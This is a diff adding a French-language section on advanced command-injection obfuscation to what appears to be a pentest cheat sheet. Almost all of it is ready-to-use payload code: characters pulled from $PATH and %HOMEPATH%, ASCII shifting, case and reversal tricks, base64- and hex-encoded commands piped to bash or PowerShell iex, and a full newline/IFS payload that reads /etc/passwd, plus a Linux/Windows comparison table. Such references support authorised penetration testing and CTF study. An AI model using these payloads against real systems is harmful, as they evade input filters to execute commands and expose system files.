@@ -436,6 +436,59 @@ who$(printf "\x61")mi  # = whoami
 %0aid
 ```
 
+#### Obfuscation avancée (Linux)
+
+```bash
+# - Extraction de caracteres depuis les variables d'environnement
+${PATH:0:1}          # = /  (premier char de $PATH)
+${LS_COLORS:10:1}    # = ;  (position variable selon le systeme)
+
+# - Decalage ASCII (character shifting)
+echo $(tr '!-}' '"-~'<<<[)   # = \  (decale [ de +1 en ASCII)
+
+# - Manipulation de casse (contourner blacklist exacte)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")     # = whoami
+$(a="WhOaMi";printf%09%s%09"${a,,}")  # variante bash 4+
+
+# - Inversion de commande
+echo 'whoami' | rev          # -> imaohw
+$(rev<<<'imaohw')            # execute whoami
+
+# - Encodage base64
+echo -n 'cat /etc/passwd' | base64   # -> Y2F0IC9ldGMvcGFzc3dk
+bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+
+# - Encodage hexadecimal avec xxd (si base64 est bloque)
+echo -n 'whoami' | xxd -p             # -> 77686f616d69
+bash<<<$(xxd -r -p<<<77686f616d69)   # execute whoami
+
+# - Payload complet (newline + IFS + extraction slash)
+127.0.0.1%0ac'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+#### Obfuscation avancée (Windows)
+
+```cmd
+:: - Extraction depuis %HOMEPATH% (\Users\...) -> \
+echo %HOMEPATH:~0,1%
+
+:: - PowerShell : premier caractere de HOMEPATH
+$env:HOMEPATH[0]
+
+:: - Manipulation de casse (insensible natif CMD/PS)
+WhOaMi
+```
+
+| Technique | Linux | Windows |
+|---|---|---|
+| Extraire `/` | `${PATH:0:1}` | `%HOMEPATH:~0,1%` |
+| Extraire `;` | `${LS_COLORS:10:1}` | N/A (utiliser `%0a` ou `&`) |
+| Decalage ASCII | `$(tr '!-}' '"-~'<<<[)` | N/A |
+| Casse | `$(tr "[A-Z]" "[a-z]"<<<"CMD")` | Natif (insensible) |
+| Inversion | `$(rev<<<'dmc')` | `iex "$('imaohw'[-1..-20] -join '')"` |
+| Base64 | `bash<<<$(base64 -d<<<PAYLOAD)` | `iex "$([...FromBase64String('PAYLOAD')])"` |
+| Hex (xxd) | `bash<<<$(xxd -r -p<<<HEXVAL)` | N/A |
+
 ### XXE
 
 ```xml
